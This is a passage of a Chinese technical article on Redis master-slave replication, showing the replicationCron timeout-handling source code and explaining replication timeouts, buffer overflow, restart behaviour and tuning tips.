{\r\n        redisLog(REDIS_WARNING,\"Timeout connecting to the MASTER...\");\r\n        undoConnectWithMaster();\r\n    }\r\n\r\n    /* Bulk transfer I/O timeout? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_TRANSFER &amp;&amp;\r\n        (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\");\r\n        replicationAbortSyncTransfer();\r\n    }\r\n\r\n    /* Timed out master when we are an already connected slave? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_CONNECTED &amp;&amp;\r\n        (time(NULL)-server.master-&gt;lastinteraction) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"MASTER timeout: no data nor PING received...\");\r\n        freeClient(server.master);\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n    /* Disconnect timedout slaves. */\r\n    if (listLength(server.slaves)) {\r\n        listIter li;\r\n        listNode *ln;\r\n        listRewind(server.slaves,&amp;li);\r\n        while((ln = listNext(&amp;li))) {\r\n            redisClient *slave = ln-&gt;value;\r\n            if (slave-&gt;replstate != REDIS_REPL_ONLINE) continue;\r\n            if (slave-&gt;flags &amp; REDIS_PRE_PSYNC) continue;\r\n            if ((server.unixtime - slave-&gt;repl_ack_time) &gt; server.repl_timeout)\r\n            {\r\n                redisLog(REDIS_WARNING, \"Disconnecting timedout slave: %s\",\r\n                    replicationGetSlaveName(slave));\r\n                freeClient(slave);\r\n            }\r\n        }\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625d682b5d0019610953-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b625d682b5d0019610953-53\">53</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-1\"><span class=\"crayon-c\">/* Replication cron function, called 1 time per second. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-2\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">replicationCron</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">replication_cron_loops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Non blocking connection timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTING</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-e\">slaveIsInHandshakeState</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-9\"><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout connecting to the MASTER...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">undoConnectWithMaster</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Bulk transfer I/O timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_TRANSFER</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">replicationAbortSyncTransfer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-22\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Timed out master when we are an already connected slave? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lastinteraction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"MASTER timeout: no data nor PING received...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-30\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-32\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Disconnect timedout slaves. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">listLength</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listIter </span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-e \">listNode *</span><span class=\"crayon-v\">ln</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listRewind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ln</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">listNext</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-39\"><span class=\"crayon-h\">            </span><span class=\"crayon-e \">redisClient *</span><span class=\"crayon-v\">slave</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ln</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">replstate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_ONLINE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-41\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">flags</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_PRE_PSYNC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-42\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">unixtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">repl_ack_time</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-43\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-44\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Disconnecting timedout slave: %s\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-45\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">replicationGetSlaveName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-46\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-50\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625d682b5d0019610953-52\"> </div><div class=\"crayon-line\" id=\"crayon-5b625d682b5d0019610953-53\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0075 seconds] -->\r\n\n</div>\n<p><strong>需要注意的坑</strong></p>\n<p>下面介绍与复制阶段连接超时有关的一些实际问题：</p>\n<p>（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。</p>\n<p>（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。</p>\n<p>（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。</p>\n<h2>3. 复制中断问题</h2>\n<p>主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。</p>\n<h3>复制缓冲区溢出</h3>\n<p>前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-&gt;复制缓冲区溢出导致连接中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致连接中断……的循环。</p>\n<p>复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。</p>\n<p>当复制缓冲区溢出时，主节点打印日志如下所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/5a5a3405eca809876a29206e7e1e8d87.png\" alt=\"\"></p>\n<p><strong>需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。</strong></p>\n<h2>4. 各场景下复制的选择及优化技巧</h2>\n<p>在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。</p>\n<h3>（1）第一次建立复制</h3>\n<p>此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。</p>\n<h3>（2）主节点重启</h3>\n<p>主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。</p>\n<p><strong>主节点宕机</strong></p>\n<p>主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。</p>\n<p>实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。</p>\n<p><strong>安全重启：debug reload</strong></p>\n<p>在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。</p>\n<p>为了解决这个问题，Redis提供了debug reload的重启方式：<strong>重启后，主节点的</strong><strong>runid</strong><strong>和offset</strong><strong>都不受影响，</strong>避免了全量复制。</p>\n<p>如下图所示，debug reload重启后runid和offset都未受影响：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6a0ba809748a0d80d181b9b9c05b10f5.png\" alt=\"\"></p>\n<p>但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。</p>\n<h3>（3）从节点重启</h3>\n<p>从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。</p>\n<h3>（4）网络中断</h3>\n<p>如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。</p>\n<p>第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF 